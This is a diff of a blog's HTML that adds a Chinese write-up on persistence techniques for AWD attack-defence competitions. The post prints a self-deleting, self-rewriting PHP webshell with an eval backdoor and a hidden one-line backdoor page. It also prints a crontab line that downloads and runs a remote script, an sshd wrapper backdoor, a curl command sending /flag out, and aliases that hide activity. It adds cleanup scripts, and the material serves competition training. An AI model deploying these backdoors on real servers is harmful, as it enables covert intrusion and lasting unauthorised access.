@@ -17,16 +17,22 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>Archive: 2020/12 | Polo&#39;s Blog</title>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Polo&#39;s Blog">
-<meta property="og:url" content="https://polosec.github.io/archives/2020/12/index.html">
+  <title>AWD新手的不死马及权限维持思路 | Polo&#39;s Blog</title>
+  <meta name="description" content="参考链接https:&#x2F;&#x2F;jlkl.github.io&#x2F;2019&#x2F;02&#x2F;08&#x2F;Web_13&#x2F;https:&#x2F;&#x2F;rmb122.com&#x2F;2019&#x2F;04&#x2F;04&#x2F;%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC&#x2F;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Cl0ud&#x2F;p&#x2F;13620537.htmlhttps:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWD新手的不死马及权限维持思路">
+<meta property="og:url" content="https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/index.html">
 <meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="参考链接https:&#x2F;&#x2F;jlkl.github.io&#x2F;2019&#x2F;02&#x2F;08&#x2F;Web_13&#x2F;https:&#x2F;&#x2F;rmb122.com&#x2F;2019&#x2F;04&#x2F;04&#x2F;%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC&#x2F;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Cl0ud&#x2F;p&#x2F;13620537.htmlhttps:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://cdn.polowong.top/1622256277454oiqbb65p.png?imageslim">
+<meta property="article:published_time" content="2021-05-29T02:42:40.000Z">
+<meta property="article:modified_time" content="2021-05-29T04:08:31.726Z">
 <meta property="article:author" content="Polo">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/1622256277454oiqbb65p.png?imageslim">
   <!-- Canonical links -->
-  <link rel="canonical" href="https://polosec.github.io/archives/2020/12/index.html">
+  <link rel="canonical" href="https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Polo&#39;s Blog" type="application/atom+xml">
   
@@ -286,68 +292,208 @@
   
   
 <main class="main" role="main">
-  	<article class="content article article-archives article-type-list" itemscope="">
-	    <header class="article-header">
-	      <h1 itemprop="title">Archive: 2020/12</h1>
-	      <p class="text-muted">Total 3 articles</p>
-	    </header>
-	    <div class="article-body">
-	      
+  <div class="content">
+  <article id="post-AWD不死马" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
   
+    <h1 class="article-title" itemprop="name">
+      AWD新手的不死马及权限维持思路
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/" class="article-date">
+	  <time datetime="2021-05-29T02:42:40.000Z" itemprop="datePublished">2021-05-29</time>
+	</a>
+</span>
+        
+        
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1.1k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 5(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <blockquote>
+<p>参考链接<br><a target="_blank" rel="noopener" href="https://jlkl.github.io/2019/02/08/Web_13/">https://jlkl.github.io/2019/02/08/Web_13/</a><br><a target="_blank" rel="noopener" href="https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/">https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/13620537.html">https://www.cnblogs.com/Cl0ud/p/13620537.html</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/88850561">https://zhuanlan.zhihu.com/p/88850561</a></p>
+</blockquote>
+<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>不死马指的是入到内存的webshell，在PHP中可以使用ulink删除自身文件并循环创建webshell。</p>
+<h1 id="不死马利用流程"><a href="#不死马利用流程" class="headerlink" title="不死马利用流程"></a>不死马利用流程</h1><p>首先根据web后门或者任何挖掘出来的漏洞尝试执行系统命令（如遗留的web后门等），通过该类漏洞成功执行写入不死马的系统命令并执行该不死马。比如通过内置的后门直接system(“echo 不死马脚本内容 &gt;/var/www/html;php 不死马文件名.php”)。这样就会在该目录下不断生成一个不死马 比如.3.php。通过webshell管理工具或者使用Python写脚本批量访问去getflag。</p>
+<h1 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h1><p>这里偷个别的师傅的图先<br><img src="http://cdn.polowong.top/1622256277454oiqbb65p.png?imageslim" alt="paste image">不死马一般长这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);&#x2F;&#x2F;设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    $file &#x3D; &#39;.3.php&#39;;</span><br><span class="line">    $code &#x3D; &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])&#x3D;&#x3D;&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;;</span><br><span class="line">    &#x2F;&#x2F;pass&#x3D;pass</span><br><span class="line">    while (1)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;);</span><br><span class="line">        usleep(0);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该不死马不断生成.3.php，通过访问<a target="_blank" rel="noopener" href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a>  然后POST a=system(“想要执行的系统命令”);即可通过不死马实现命令执行。这里使用MD5是因为防止别人骑着自己的马进去了，MD5理论上不可逆。如果使用python批量getshell的话大体思路就是</p>
+<p>url=<a target="_blank" rel="noopener" href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a><br>data={“a”:”system(&quot;cat /flag&quot;);”}<br>flag=requests.post(url=url,data=data).text然后url变变就可以，一般会维护一个地址池 从地址池里面取url或者取特征（可能某个url字段不一样）直接打就行，再配合提交flag的api就可以实现自动getflag。</p>
+<h1 id="不死马删除"><a href="#不死马删除" class="headerlink" title="不死马删除"></a>不死马删除</h1><p>这里不死马删除有几个思路<br>1.shell脚本直接删除不死马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while :</span><br><span class="line">do</span><br><span class="line">	rm -rf .3.php;</span><br><span class="line">	echo &quot;remove success&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<p>这里其实可以更完善一些，比如挂上while自动检测新增的文件 或者配合文件监控脚本实现新增之后直接调用函数删除新增的文件等等（Python实现，我不会shell）<br>2.PHP服务重启（awd环境可能不允许，因为权限较低）<br>service apache2 restart<br>service php restart</p>
+<p>3.杀低权限PHP进程<br>php-apache:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep httpd | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>php-fpm:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep php-fpm | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="awd权限维持"><a href="#awd权限维持" class="headerlink" title="awd权限维持"></a>awd权限维持</h1><p>AWD的权限维持其实和普通的权限维持差不多常用的大概有 crontab ssh软连接 sshwrapper。<br>详情参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7338%E7%BB%86%E7%9C%8B%E4%BA%86%E4%B8%8B%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0">https://xz.aliyun.com/t/7338细看了下这篇文章</a> 发现了一个隐藏一句话的方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?&#x3D;\&#96;\$_POST[cmd]\&#96;?&gt;\r&lt;?&#x3D;&#39;System default page.&#39;;?&gt;&quot; &gt;default.php</span><br></pre></td></tr></table></figure>
+<p>crontab添加计划任务自动写不死马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * curl http:&#x2F;&#x2F;host&#x2F;sh.sh &gt;&#x2F;tmp&#x2F;.tmp&#x2F;1.sh;chmod u+x &#x2F;tmp&#x2F;.tmp&#x2F;1.sh ; &#x2F;tmp&#x2F;.tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure>
+
+<p>本地起一个http服务 放上一个sh.sh脚本，里面写了创建php不死马的命令。<br>下面两种暂时利用失败 可能是腾讯云的原因。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh wrapper</span><br><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">exp:</span><br><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line">ssh软连接</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;5555;</span><br><span class="line">建立一个软连接，然后通过5555端口访问ssh服务</span><br></pre></td></tr></table></figure>
+<p>还有一种操作就是curl外带本地命令执行结果,这个也可以写到crontab里面，比较方便的使用提交flag的api提交flag。示例如下</p>
+<p>curl “http://:7777?flag=$(cat /flag)”</p>
+<h1 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h1><p>用来迷惑对手</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias crontab&#x3D;&quot;echo no crontab for &#96;whoami&#96; ||&quot;</span><br><span class="line">alias cat&#x3D;&quot;echo &#96;date&#96;|md5sum|cut -d &#39; &#39; -f1||&quot;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <p style="width: 100%;
+  word-wrap: break-word;
+  word-break: break-all;
+  overflow: hidden;">hhttps://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/</p>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/polosec" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="http://cdn.polowong.top/1.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/polosec" target="_blank"><span class="text-dark">Polo</span><small class="ml-1x">CTFer&amp;Cybersec Researcher</small></a></h3>
+        <div>Wong</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
   
     
+  <section id="comments">
+  	
+      <div id="uyan_frame"></div>
     
-      
-      
-      <section class="panel panel-default b-no">
-        <div class="panel-heading" role="tab">
-          <h3 class="panel-title">
-            <a data-toggle="collapse" href="#collapse2020" aria-expanded="true">
-              <i class="icon icon-calendar-plus text-active"></i><i class="icon icon-calendar-minus text"></i>
-              2020
-            </a>
-            <!-- <a href="/archives/2020" class="archive-year">2020</a> -->
-          </h3>
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/" title="安网杯部分wp"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
         </div>
-        <div id="collapse2020" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="heading2020">
-        <div class="panel-body">
-          <div class="collection">
-    
-    
-<a href="/2020/12/22/%E8%BF%91%E6%9C%9Fssti/" class="collection-item" target="_blank" itemprop="url">
-  <time datetime="2020-12-22T07:35:19.000Z" itemprop="datePublished">2020-12-22</time>
-  <span>&nbsp;&nbsp;&nbsp;</span> 近期ssti题目总结
-</a>
+      </div>
+    </div>
+  </div>
+</div>
 
 
-  
-    
-    
-    
-<a href="/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/" class="collection-item" target="_blank" itemprop="url">
-  <time datetime="2020-12-16T09:28:02.000Z" itemprop="datePublished">2020-12-16</time>
-  <span>&nbsp;&nbsp;&nbsp;</span> VULSTACK 红队评估(二) 
-</a>
 
-
-  
-    
-    
-    
-<a href="/2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="collection-item" target="_blank" itemprop="url">
-  <time datetime="2020-12-03T10:04:01.000Z" itemprop="datePublished">2020-12-03</time>
-  <span>&nbsp;&nbsp;&nbsp;</span> vulstack 红队评估(一) 内网渗透
-</a>
-
-
-  
-  
-    </div></div></div></section>
-  
-
-	    </div>
-  	</article>
-  	 	
 </main>
 
   <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
@@ -399,6 +545,18 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+    <script defer type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=[object Object]"></script>
 
 
 
